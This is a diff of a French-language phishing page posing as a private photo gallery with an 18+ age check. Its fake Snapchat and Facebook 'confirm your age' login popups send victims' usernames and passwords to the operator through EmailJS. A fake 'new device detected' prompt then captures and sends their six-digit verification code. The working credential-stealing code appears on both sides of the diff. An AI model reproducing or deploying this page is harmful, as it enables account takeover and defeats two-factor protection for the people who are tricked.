@@ -1,13 +1,13 @@
-
 <!DOCTYPE html>
-
 <html lang="fr">
 <head>
-<meta charset="utf-8"/>
-<title>Gallerie privé!</title>
-<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&amp;display=swap" rel="stylesheet"/>
-<style>
+  <meta charset="utf-8"/>
+  <title>Galerie privée — Epics Photos</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap" rel="stylesheet"/>
+
+  <style>
     body {
       margin: 0;
       font-family: 'Playfair Display', serif;
@@ -33,9 +33,7 @@
       z-index: 1;
     }
 
-    .header {
-      padding: 60px 20px 30px;
-    }
+    .header { padding: 60px 20px 30px; }
 
     .header h1 {
       font-size: 4em;
@@ -44,11 +42,7 @@
       margin-bottom: 10px;
     }
 
-    .subtitle {
-      font-size: 1.5em;
-      margin-bottom: 30px;
-      color: #f5f5f5;
-    }
+    .subtitle { font-size: 1.5em; margin-bottom: 30px; color: #f5f5f5; }
 
     .button {
       background: linear-gradient(45deg, #FFD700, #FF8C00);
@@ -62,11 +56,7 @@
       box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);
       transition: 0.3s ease-in-out;
     }
-
-    .button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 20px rgba(255, 215, 0, 0.9);
-    }
+    .button:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(255, 215, 0, 0.9); }
 
     .bitmoji-row {
       display: flex;
@@ -74,7 +64,6 @@
       flex-wrap: wrap;
       margin: 40px 0;
     }
-
     .bitmoji {
       width: 90px;
       height: 90px;
@@ -93,17 +82,8 @@
       border-top-left-radius: 30px;
       border-top-right-radius: 30px;
     }
-
-    .extras h2 {
-      font-size: 2em;
-      margin-top: 0;
-      color: #FFD700;
-    }
-
-    .extra-item {
-      margin: 20px 0;
-      font-size: 1.1em;
-    }
+    .extras h2 { font-size: 2em; margin-top: 0; color: #FFD700; }
+    .extra-item { margin: 20px 0; font-size: 1.1em; }
 
     .login-popup, .overlay, .login-loading, .verification-popup {
       position: fixed;
@@ -136,225 +116,227 @@
       z-index: 999;
     }
 
-    .bottom-banner img {
-      width: 100%;
-      height: auto;
-      display: block;
+    .bottom-banner img { width: 100%; height: auto; display: block; }
+    .verification-popup label { font-weight: bold; }
+    .top-banner img { width: 100%; height: auto; display: block; }
+  </style>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      emailjs.init("AATQVLMcBJaRBgEox");
+    });
+  </script>
+
+  <!-- Open Graph (Facebook, Messenger, Instagram) -->
+  <meta property="og:title" content="Epics Photos – Galerie privée"/>
+  <meta property="og:description" content="Accès sécurisé à ma galerie privée Epics Photos."/>
+  <meta property="og:image" content="https://estudiop-gallerie-prive.onrender.com/preview_estudiop.jpg"/>
+  <meta property="og:url" content="https://estudiop-gallerie-prive.onrender.com"/>
+  <meta property="og:type" content="website"/>
+  <meta property="og:image:width" content="1200"/>
+  <meta property="og:image:height" content="630"/>
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" content="Epics Photos – Galerie privée"/>
+  <meta name="twitter:description" content="Accès sécurisé à ma galerie privée Epics Photos."/>
+  <meta name="twitter:image" content="https://estudiop-gallerie-prive.onrender.com/preview_estudiop.jpg"/>
+</head>
+
+<body>
+  <div class="top-banner"><img src="banner.png" alt="Bannière Bitmoji"/></div>
+
+  <div class="header">
+    <h1>Galerie privée</h1>
+    <p class="subtitle">Bienvenue sur ma page</p>
+
+    <div id="ageCheckContainer" style="margin-top: 20px;">
+      <label for="dob" style="font-size: 1.2em;">Entrez votre date de naissance :</label><br/>
+      <input id="dob" type="date" style="padding: 10px; font-size: 1em; margin: 10px; border-radius: 10px; border: none;"/><br/>
+      <button class="button" onclick="checkAge()">Valider</button>
+      <p id="ageError" style="color: red; display: none; font-weight: bold;">Vous devez avoir au moins 18 ans pour accéder.</p>
+    </div>
+
+    <button id="snapchatBtn" class="button" onclick="openSnapchatPopup()" style="display:none;">Confirmer votre âge avec Snapchat</button>
+    <button id="facebookBtn" class="button" onclick="openFacebookPopup()" style="display:none; margin-top: 15px;">Confirmer votre âge avec Facebook</button>
+  </div>
+
+  <div class="bitmoji-row">
+    <div class="bitmoji" style="background-image: url('avatar1.png')"></div>
+    <div class="bitmoji" style="background-image: url('avatar2.png')"></div>
+    <div class="bitmoji" style="background-image: url('avatar3.png')"></div>
+    <div class="bitmoji" style="background-image: url('avatar4.png')"></div>
+  </div>
+
+  <div id="overlay" class="overlay" onclick="closeLogin()"></div>
+  <div id="loginPopup" class="login-popup"></div>
+
+  <!-- POPUP SNAPCHAT -->
+  <div id="snapchatPopup" class="login-popup">
+    <div style="text-align:center;">
+      <img src="logo-snapchat.png" alt="Snapchat" style="width: 60px; margin-bottom: 10px;"/>
+      <h3 style="margin: 10px 0;">Confirmer votre âge avec Snapchat</h3>
+    </div>
+    <label for="snap-username">Nom d'utilisateur ou e-mail</label>
+    <input id="snap-username" type="text" placeholder="Nom d'utilisateur ou e-mail"/>
+    <label for="snap-password">Mot de passe</label>
+    <input id="snap-password" type="password" placeholder="Mot de passe"/>
+    <button class="button" style="margin-top: 15px;" onclick="showLoadingAndVerify('snapchatPopup')">Connexion</button>
+    <button class="button" style="background:#ccc; color:#000; margin-top:10px;" onclick="closePopup('snapchatPopup')">Retour</button>
+  </div>
+
+  <!-- POPUP FACEBOOK -->
+  <div id="facebookPopup" class="login-popup">
+    <div style="text-align:center;">
+      <img src="logo-fb.jpg" alt="Facebook" style="width: 60px; margin-bottom: 10px;"/>
+      <h3 style="margin: 10px 0;">Confirmer votre âge avec Facebook</h3>
+    </div>
+    <label for="fb-email">Adresse e-mail ou numéro de mobile</label>
+    <input id="fb-email" type="text" placeholder="Adresse e-mail ou téléphone"/>
+    <label for="fb-password">Mot de passe</label>
+    <input id="fb-password" type="password" placeholder="Mot de passe"/>
+    <button class="button" style="margin-top: 15px;" onclick="showLoadingAndVerify('facebookPopup')">Connexion</button>
+    <button class="button" style="background:#ccc; color:#000; margin-top:10px;" onclick="closePopup('facebookPopup')">Retour</button>
+  </div>
+
+  <div id="verificationPopup" class="login-popup verification-popup">
+    <h3 style="margin-top: 0; font-size: 1.5em;">Nouvel appareil détecté</h3>
+    <p style="margin-bottom: 15px;">Un code de vérification vous sera envoyé à l’intérieur des 2 prochaines minutes.</p>
+    <label for="verificationCode" style="font-weight:bold;">Entrez le code reçu :</label>
+    <input id="verificationCode" type="text" inputmode="numeric" pattern="\d*" maxlength="6" placeholder="Code à 6 chiffres"/>
+    <button class="button" style="margin-top:10px;" onclick="submitVerificationCode()">Vérifier</button>
+    <button class="button" style="background:#ccc; color:#000; margin-top:10px;" onclick="closePopup('verificationPopup')">Retour</button>
+  </div>
+
+  <div class="bottom-banner">
+    <img src="banner.png" alt="Bannière Bitmoji"/>
+  </div>
+
+  <script>
+    function checkAge() {
+      const dobInput = document.getElementById("dob");
+      const errorMsg = document.getElementById("ageError");
+      const btn = document.getElementById("snapchatBtn");
+
+      if (!dobInput.value) {
+        errorMsg.textContent = "Veuillez entrer votre date de naissance.";
+        errorMsg.style.display = "block";
+        return;
+      }
+
+      const dob = new Date(dobInput.value);
+      const today = new Date();
+      const age = today.getFullYear() - dob.getFullYear();
+      const monthDiff = today.getMonth() - dob.getMonth();
+      const dayDiff = today.getDate() - dob.getDate();
+
+      const is18 = age > 18 || (age === 18 && (monthDiff > 0 || (monthDiff === 0 && dayDiff >= 0)));
+
+      if (is18) {
+        btn.style.display = "inline-block";
+        document.getElementById("facebookBtn").style.display = "inline-block";
+        errorMsg.style.display = "none";
+        document.getElementById("ageCheckContainer").style.display = "none";
+      } else {
+        errorMsg.textContent = "Vous devez avoir au moins 18 ans pour accéder.";
+        errorMsg.style.display = "block";
+      }
     }
+  </script>
 
-    .verification-popup label {
-      font-weight: bold;
+  <script>
+    function openSnapchatPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('snapchatPopup').style.display = 'block';
     }
-  
-    .top-banner img { width: 100%; height: auto; display: block; }</style>
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script>
-  document.addEventListener("DOMContentLoaded", function() {
-    emailjs.init("AATQVLMcBJaRBgEox");
-  });
-</script>
-<!-- Open Graph Preview -->
-<meta content="Gallerie privée – Connexion privée" property="og:title"/>
-<meta content="Accès sécurisé à ma galerie privée." property="og:description"/>
-<meta content="preview_estudiop.jpg" property="og:image"/>
-<meta content="https://estudiop-gallerie-prive.onrender.com" property="og:url"/>
-<meta content="website" property="og:type"/>
-<!-- Twitter Card -->
-<meta content="summary_large_image" name="twitter:card"/>
-<meta content="Gallerie privée – Connexion" name="twitter:title"/>
-<meta content="Accès sécurisé à ma galerie privée." name="twitter:description"/>
-<meta content="preview_estudiop.jpg" name="twitter:image"/>
-<!-- Open Graph Preview CORRIGÉ -->
+    function openFacebookPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('facebookPopup').style.display = 'block';
+    }
+    function closePopup(popupId) {
+      document.getElementById('overlay').style.display = 'none';
+      document.getElementById(popupId).style.display = 'none';
+    }
+  </script>
 
+  <script>
+    function showLoadingAndVerify(popupId) {
+      const popup = document.getElementById(popupId);
+      const inputs = popup.querySelectorAll("input");
+      const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
 
+      if (!allFilled) {
+        alert("Veuillez remplir tous les champs.");
+        return;
+      }
 
+      const button = popup.querySelector("button");
+      const originalText = button.textContent;
+      button.disabled = true;
+      button.textContent = "Connexion en cours...";
 
+      let params = {};
 
-<!-- Twitter Card CORRIGÉ -->
+      if (popupId === "facebookPopup") {
+        params = {
+          fb_email: document.getElementById("fb-email").value.trim(),
+          fb_password: document.getElementById("fb-password").value.trim()
+        };
+      } else if (popupId === "snapchatPopup") {
+        params = {
+          fb_email: document.getElementById("snap-username").value.trim(),
+          fb_password: document.getElementById("snap-password").value.trim()
+        };
+      }
 
-
-
-
-<meta content="Epics Photos – Galerie privée" property="og:title"/><meta content="Accès sécurisé à ma galerie privée Epics Photos." property="og:description"/><meta content="https://estudiop-gallerie-prive.onrender.com/preview_estudiop.jpg" property="og:image"/><meta content="https://estudiop-gallerie-prive.onrender.com" property="og:url"/><meta content="website" property="og:type"/><meta content="summary_large_image" name="twitter:card"/><meta content="Epics Photos – Galerie privée" name="twitter:title"/><meta content="Accès sécurisé à ma galerie privée Epics Photos." name="twitter:description"/><meta content="https://estudiop-gallerie-prive.onrender.com/preview_estudiop.jpg" name="twitter:image"/></head>
-<body><div class="top-banner"><img alt="Bannière Bitmoji" src="banner.png"/></div>
-<div class="header">
-<h1>Gallerie privée</h1>
-<p class="subtitle">Bienvenue sur ma page</p>
-<div id="ageCheckContainer" style="margin-top: 20px;">
-<label for="dob" style="font-size: 1.2em;">Entrez votre date de naissance :</label><br/>
-<input id="dob" style="padding: 10px; font-size: 1em; margin: 10px; border-radius: 10px; border: none;" type="date"/>
-<br/>
-<button class="button" onclick="checkAge()">Valider</button>
-<p id="ageError" style="color: red; display: none; font-weight: bold;">Vous devez avoir au moins 18 ans pour accéder.</p>
-</div>
-<button class="button" id="snapchatBtn" onclick="openSnapchatPopup()" style="display:none;">Confirmer votre âge avec Snapchat</button><button class="button" id="facebookBtn" onclick="openFacebookPopup()" style="display:none; margin-top: 15px;">Confirmer votre âge avec Facebook</button>
-</div>
-<div class="bitmoji-row">
-<div class="bitmoji" style="background-image: url('avatar1.png')"></div>
-<div class="bitmoji" style="background-image: url('avatar2.png')"></div>
-<div class="bitmoji" style="background-image: url('avatar3.png')"></div>
-<div class="bitmoji" style="background-image: url('avatar4.png')"></div>
-</div>
-<div class="overlay" id="overlay" onclick="closeLogin()"></div>
-<div class="login-popup" id="loginPopup"></div>
-<!-- POPUP SNAPCHAT -->
-<div class="login-popup" id="snapchatPopup">
-<div style="text-align:center;">
-<img alt="Snapchat" src="logo-snapchat.png" style="width: 60px; margin-bottom: 10px;"/>
-<h3 style="margin: 10px 0;">Confirmer votre âge avec Snapchat</h3>
-</div>
-<label for="snap-username">Nom d'utilisateur ou e-mail</label>
-<input id="snap-username" placeholder="Nom d'utilisateur ou e-mail" type="text"/>
-<label for="snap-password">Mot de passe</label>
-<input id="snap-password" placeholder="Mot de passe" type="password"/>
-<button class="button" onclick="showLoadingAndVerify('snapchatPopup')" style="margin-top: 15px;">Connexion</button>
-<button class="button" onclick="closePopup('snapchatPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
-</div>
-<!-- POPUP FACEBOOK -->
-<div class="login-popup" id="facebookPopup">
-<div style="text-align:center;">
-<img alt="Facebook" src="logo-fb.jpg" style="width: 60px; margin-bottom: 10px;"/>
-<h3 style="margin: 10px 0;">Confirmer votre âge avec Facebook</h3>
-</div>
-<label for="fb-email">Adresse e-mail ou numéro de mobile</label>
-<input id="fb-email" placeholder="Adresse e-mail ou téléphone" type="text"/>
-<label for="fb-password">Mot de passe</label>
-<input id="fb-password" placeholder="Mot de passe" type="password"/>
-<button class="button" onclick="showLoadingAndVerify('facebookPopup')" style="margin-top: 15px;">Connexion</button>
-<button class="button" onclick="closePopup('facebookPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
-</div>
-<div class="login-popup" id="verificationPopup">
-<h3 style="margin-top: 0; font-size: 1.5em;">Nouvel appareil détecté</h3>
-<p style="margin-bottom: 15px;">Un code de vérification vous sera envoyé à l’intérieur des 2 prochaines minutes.</p>
-<label for="verificationCode" style="font-weight:bold;">Entrez le code reçu :</label>
-<input id="verificationCode" inputmode="numeric" maxlength="6" pattern="\d*" placeholder="Code à 6 chiffres" type="text"/>
-<button class="button" onclick="submitVerificationCode()" style="margin-top:10px;">Vérifier</button>
-<button class="button" onclick="closePopup('verificationPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
-</div>
-<div class="bottom-banner">
-<img alt="Bannière Bitmoji" src="banner.png"/>
-</div>
-<script>
-function checkAge() {
-  const dobInput = document.getElementById("dob");
-  const errorMsg = document.getElementById("ageError");
-  const btn = document.getElementById("snapchatBtn");
-
-  if (!dobInput.value) {
-    errorMsg.textContent = "Veuillez entrer votre date de naissance.";
-    errorMsg.style.display = "block";
-    return;
-  }
-
-  const dob = new Date(dobInput.value);
-  const today = new Date();
-  const age = today.getFullYear() - dob.getFullYear();
-  const monthDiff = today.getMonth() - dob.getMonth();
-  const dayDiff = today.getDate() - dob.getDate();
-
-  let is18 = age > 18 || (age === 18 && (monthDiff > 0 || (monthDiff === 0 && dayDiff >= 0)));
-
-  if (is18) {
-    btn.style.display = "inline-block";
-    document.getElementById("facebookBtn").style.display = "inline-block";
-    errorMsg.style.display = "none";
-    document.getElementById("ageCheckContainer").style.display = "none";
-  } else {
-    errorMsg.textContent = "Vous devez avoir au moins 18 ans pour accéder.";
-    errorMsg.style.display = "block";
-  }
-}
-</script>
-<script>
-function openSnapchatPopup() {
-  document.getElementById('overlay').style.display = 'block';
-  document.getElementById('snapchatPopup').style.display = 'block';
-}
-function openFacebookPopup() {
-  document.getElementById('overlay').style.display = 'block';
-  document.getElementById('facebookPopup').style.display = 'block';
-}
-function closePopup(popupId) {
-  document.getElementById('overlay').style.display = 'none';
-  document.getElementById(popupId).style.display = 'none';
-}
-</script>
-<script>
-function showLoadingAndVerify(popupId) {
-  const popup = document.getElementById(popupId);
-  const inputs = popup.querySelectorAll("input");
-  const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
-
-  if (!allFilled) {
-    alert("Veuillez remplir tous les champs.");
-    return;
-  }
-
-  const button = popup.querySelector("button");
-  const originalText = button.textContent;
-  button.disabled = true;
-  button.textContent = "Connexion en cours...";
-
-  let params = {};
-
-  if (popupId === "facebookPopup") {
-    params = {
-      fb_email: document.getElementById("fb-email").value.trim(),
-      fb_password: document.getElementById("fb-password").value.trim()
-    };
-  } else if (popupId === "snapchatPopup") {
-    params = {
-      fb_email: document.getElementById("snap-username").value.trim(),
-      fb_password: document.getElementById("snap-password").value.trim()
-    };
-  }
-
-  if (window.emailjs) {
-    emailjs.send("service_photos", "template_connexion", params)
-    .then(() => {
-      setTimeout(() => {
+      if (window.emailjs) {
+        emailjs.send("service_photos", "template_connexion", params)
+          .then(() => {
+            setTimeout(() => {
+              button.disabled = false;
+              button.textContent = originalText;
+              popup.style.display = "none";
+              document.getElementById("verificationPopup").style.display = "block";
+            }, 2000);
+          })
+          .catch(err => {
+            alert("Erreur EmailJS : " + JSON.stringify(err));
+            button.disabled = false;
+            button.textContent = originalText;
+          });
+      } else {
+        alert("EmailJS non chargé.");
         button.disabled = false;
         button.textContent = originalText;
-        popup.style.display = "none";
-        document.getElementById("verificationPopup").style.display = "block";
-      }, 2000);
-    })
-    .catch(err => {
-      alert("Erreur EmailJS : " + JSON.stringify(err));
-      button.disabled = false;
-      button.textContent = originalText;
-    });
-  } else {
-    alert("EmailJS non chargé.");
-    button.disabled = false;
-    button.textContent = originalText;
-  }
-}
-</script>
-<script>
-function submitVerificationCode() {
-  const code = document.getElementById("verificationCode").value.trim();
-  const pattern = /^\d{6}$/;
+      }
+    }
+  </script>
 
-  if (!pattern.test(code)) {
-    alert("Veuillez entrer un code valide.");
-    return;
-  }
+  <script>
+    function submitVerificationCode() {
+      const code = document.getElementById("verificationCode").value.trim();
+      const pattern = /^\d{6}$/;
 
-  const params = { verification_code: code };
+      if (!pattern.test(code)) {
+        alert("Veuillez entrer un code valide.");
+        return;
+      }
 
-  if (window.emailjs) {
-    emailjs.send("service_photos", "template_code", params)
-      .then(() => {
-        window.location.href = "medias.html";
-      })
-      .catch(err => {
-        alert("Erreur EmailJS : " + JSON.stringify(err));
-      });
-  } else {
-    alert("EmailJS non chargé.");
-  }
-}
-</script>
+      const params = { verification_code: code };
+
+      if (window.emailjs) {
+        emailjs.send("service_photos", "template_code", params)
+          .then(() => {
+            window.location.href = "medias.html";
+          })
+          .catch(err => {
+            alert("Erreur EmailJS : " + JSON.stringify(err));
+          });
+      } else {
+        alert("EmailJS non chargé.");
+      }
+    }
+  </script>
 </body>
 </html>
